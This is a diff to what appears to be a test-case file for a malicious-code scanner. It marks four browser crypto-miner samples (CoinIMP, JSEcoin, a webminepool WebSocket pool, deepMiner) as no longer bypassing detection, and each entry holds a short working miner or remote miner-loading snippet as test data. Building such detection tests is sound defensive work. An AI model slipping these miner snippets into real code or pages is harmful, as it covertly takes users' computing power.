@@ -65,28 +65,28 @@ module.exports = [
   {
     id: 'miner-coinimp',
     category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: brand added to BLOCK_SIGNATURES (Phase 1)
     description: 'CoinIMP browser miner — brand not in the signature list, so it is not flagged',
     code: `const miner = new Client.Anonymous('coinimp-site-key', { throttle: 0.3 }); miner.start(); module.exports = miner;`,
   },
   {
     id: 'miner-jsecoin',
     category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: brand added to BLOCK_SIGNATURES (Phase 1)
     description: 'JSEcoin miner — not in the brand signature list',
     code: `const s = document.createElement('script'); s.src = 'https://load.jsecoin.com/load/'; document.body.appendChild(s); module.exports = {};`,
   },
   {
     id: 'miner-webminepool-ws',
     category: 'crypto-miner', technique: 'websocket-pool', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: brand added to BLOCK_SIGNATURES (Phase 1)
     description: 'WebSocket-proxied pool (webminepool) — no stratum+tcp/stratum:// literal',
     code: `const ws = new WebSocket('wss://ws.webminepool.com/'); ws.onopen = () => ws.send('{"type":"auth"}'); module.exports = ws;`,
   },
   {
     id: 'miner-deepminer',
     category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: brand added to BLOCK_SIGNATURES (Phase 1)
     description: 'deepMiner fork — brand not covered',
     code: `const m = new deepMiner.Anonymous('wallet.worker'); m.start(); module.exports = m;`,
   },
